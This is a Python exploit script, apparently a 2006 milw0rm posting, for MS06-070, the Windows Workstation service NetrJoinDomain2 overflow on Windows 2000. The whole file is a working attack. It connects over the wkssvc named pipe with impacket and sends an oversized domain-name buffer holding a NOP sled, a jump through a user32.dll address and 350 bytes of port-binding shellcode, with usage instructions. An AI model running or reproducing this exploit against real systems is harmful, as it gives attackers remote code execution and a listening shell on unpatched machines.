#!/usr/bin/python
# MS06-070 Windows WorkStation NetpManageIPCConnect Vulnerability Exploit
# Tested on windows 2000 server SP4
#
# Usage: python NetAPI-NetrJoinDomain2.py <target ip> <domainname>
# Requires a domain controller on the network (configure samba as DC)
# Requires python and impacket
#
# Winny M Thomas ;-)


from impacket.dcerpc import transport
from impacket import uuid
import sys
import socket
import struct

def DCEconnectAndExploit(target, domain):
       baselen = 3708

       stringbinding = "ncacn_np:%(host)s[\\pipe\\%(pipe)s]"
       stringbinding %= {'host': target,'pipe': 'wkssvc','port': 445,}

       print 'Connecting to named pipe (wkssvc)'
       trans = transport.DCERPCTransportFactory(stringbinding)
       trans.connect()
       print 'Setting up DCE transport'
       dce = trans.DCERPC_class(trans)
       dce.bind(uuid.uuidtup_to_bin(('6bffd098-a112-3610-9833-46c3f87e345a','1.0')))

       print 'Sending attack payload to target'
       #NetrJoinDomain2 data: Hostname
       query1 =  "\xaa\xbb\xcc\xdd"
       query1 += "\x07\x00\x00\x00"
       query1 += "\x00\x00\x00\x00"
       query1 += "\x07\x00\x00\x00"
       query1 += "\x5C\x00\x5C\x00"
       query1 += "\x41\x00\x55\x00"
       query1 += "\x58\x00\x37\x00"
       query1 += "\x00\x00\x00\x00"

       #NetrJoinDomain2 data: Domain/Hostname

       targetd = '\x00'.join(list(domain)) + '\x00'
       Len = baselen + len(domain)
       query2 =  struct.pack('L', Len)
       query2 += struct.pack('L', 0)
       query2 += struct.pack('L', Len)
       query2 += targetd

       query3 = "\x5C\x00\x5C\x00\x76\x00\x90\x90"
       query3 += "\x90\x90" * 1058
       query3 += "\xEB\x06" #6 byte jump from current pointer in ebx
       query3 += "\x27\x16\xE1\x77" #Address from user32.dll (0x77E11627)
       #350 byte port binding shellcode
       query3 += "\x90\x90\x90\x90\x90\x90"
       query3 += "\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
       query3 += "\x13\xe9\x59\x23\xce\x83\xeb\xfc\xe2\xf4\x15\x33\xc8\x83"
       query3 += "\x01\xa0\xdc\x31\x16\x39\xa8\xa2\xcd\x7d\xa8\x8b\xd5\xd2"
       query3 += "\x5f\xcb\x91\x58\xcc\x45\xa6\x41\xa8\x91\xc9\x58\xc8\x87"
       query3 += "\x62\x6d\xa8\xcf\x07\x68\xe3\x57\x45\xdd\xe3\xba\xee\x98"
       query3 += "\xe9\xc3\xe8\x9b\xc8\x3a\xd2\x0d\x07\xe6\x9c\xbc\xa8\x91"
       query3 += "\xcd\x58\xc8\xa8\x62\x55\x68\x45\xb6\x45\x22\x25\xea\x75"
       query3 += "\xa8\x47\x85\x7d\x3f\xaf\x2a\x68\xf8\xaa\x62\x1a\x13\x45"
       query3 += "\xa9\x55\xa8\xbe\xf5\xf4\xa8\x8e\xe1\x07\x4b\x40\xa7\x57"
       query3 += "\xcf\x9e\x16\x8f\x45\x9d\x8f\x31\x10\xfc\x81\x2e\x50\xfc"
       query3 += "\xb6\x0d\xdc\x1e\x81\x92\xce\x32\xd2\x09\xdc\x18\xb6\xd0"
       query3 += "\xc6\xa8\x68\xb4\x2b\xcc\xbc\x33\x21\x31\x39\x31\xfa\xc7"
       query3 += "\x1c\xf4\x74\x31\x3f\x0a\x70\x9d\xba\x0a\x60\x9d\xaa\x0a"
       query3 += "\xdc\x1e\x8f\x31\x32\x95\x8f\x0a\xaa\x2f\x7c\x31\x87\xd4"
       query3 += "\x99\x9e\x74\x31\x3f\x33\x33\x9f\xbc\xa6\xf3\xa6\x4d\xf4"
       query3 += "\x0d\x27\xbe\xa6\xf5\x9d\xbc\xa6\xf3\xa6\x0c\x10\xa5\x87"
       query3 += "\xbe\xa6\xf5\x9e\xbd\x0d\x76\x31\x39\xca\x4b\x29\x90\x9f"
       query3 += "\x5a\x99\x16\x8f\x76\x31\x39\x3f\x49\xaa\x8f\x31\x40\xa3"
       query3 += "\x60\xbc\x49\x9e\xb0\x70\xef\x47\x0e\x33\x67\x47\x0b\x68"
       query3 += "\xe3\x3d\x43\xa7\x61\xe3\x17\x1b\x0f\x5d\x64\x23\x1b\x65"
       query3 += "\x42\xf2\x4b\xbc\x17\xea\x35\x31\x9c\x1d\xdc\x18\xb2\x0e"
       query3 += "\x71\x9f\xb8\x08\x49\xcf\xb8\x08\x76\x9f\x16\x89\x4b\x63"
       query3 += "\x30\x5c\xed\x9d\x16\x8f\x49\x31\x16\x6e\xdc\x1e\x62\x0e"
       query3 += "\xdf\x4d\x2d\x3d\xdc\x18\xbb\xa6\xf3\xa6\x19\xd3\x27\x91"
       query3 += "\xba\xa6\xf5\x31\x39\x59\x23\xce";
       query3 += "\x90\x90" * 2467
       query3 += "\x00\x00"

       query3 += "\x00\x00\x00\x00"
       query3 += "\x00\x00\x00\x00"
       query3 += "\x00\x00\x00\x00"
       query3 += "\x00\x00"
       query3 += "\x01\x00\x00\x00"

       query = query1 + query2 + query3
       dce.call(0x16, query)

if __name__ == '__main__':
       try:
               target = sys.argv[1]
               domain = sys.argv[2]
       except IndexError:
               print 'Usage: %s <target ip> <domain>' % sys.argv[0]
               sys.exit(-1)

       DCEconnectAndExploit(target, domain)

# milw0rm.com [2006-11-18]
